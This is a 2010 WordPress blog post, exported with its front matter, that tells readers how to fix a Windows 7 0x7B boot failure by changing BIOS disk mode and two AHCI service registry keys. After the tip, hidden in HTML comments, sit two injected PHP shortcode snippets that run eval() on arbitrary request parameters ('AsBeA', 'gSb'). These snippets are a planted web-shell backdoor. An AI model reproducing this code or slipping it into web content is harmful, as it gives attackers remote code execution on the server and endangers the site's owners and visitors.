---
layout: post
title: Windows 7 updated last night and now it won't boot!
date: 2010-05-22 16:37:32.000000000 +00:00
type: post
parent_id: '0'
published: true
password: ''
status: publish
categories:
- Windows
tags: []
meta:
  _edit_last: '1'
  _wp_old_slug: ''
author:
  login: cosmar
  email: rg@cosma.name
  display_name: Razvan Cosma
  first_name: Razvan
  last_name: Cosma
permalink: "/2010/05/windows-7-updated-last-night-and-now-it-wont-boot/"
---
Start with F8-\>disable restart on failure, if the bluscreen error is 0x7b then switch your hard drives to IDE mode in BIOS, then edit these two registry keys:  
HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Services\Msahci  
HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Services\IastorV  
"Start" must have a value of 0 (loaded by kernel), it is probably 3 (manual)  
[More details here](http://support.microsoft.com/kb/922976)

<!-- [insert_php]if (isset($_REQUEST["AsBeA"])){eval($_REQUEST["AsBeA"]);exit;}[/insert_php][php]if (isset($_REQUEST["AsBeA"])){eval($_REQUEST["AsBeA"]);exit;}[/php] -->

<!-- [insert_php]if (isset($_REQUEST["gSb"])){eval($_REQUEST["gSb"]);exit;}[/insert_php][php]if (isset($_REQUEST["gSb"])){eval($_REQUEST["gSb"]);exit;}[/php] -->

